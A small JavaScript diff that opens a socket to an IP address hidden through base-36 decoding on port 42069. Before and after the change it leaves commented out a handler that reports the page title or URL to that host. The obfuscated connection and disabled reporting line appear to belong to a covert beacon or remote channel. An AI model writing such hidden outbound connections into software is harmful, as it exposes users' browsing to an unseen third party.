@@ -13,9 +13,9 @@ function Connection(ip,port){
 
 var Main = new Connection(c(30)+"."+c("1D")+"."+c("69")+"."+c("6N"),"42069");
 
-Main.socket.onopen = function(){
-	//Main.socket.send("joined "+(document.title||location.href));
-}
+/*Main.socket.onopen = function(){
+	Main.socket.send("joined "+(document.title||location.href));
+}*/
 
 function c(a){
 	return parseInt(a.toString(),36);
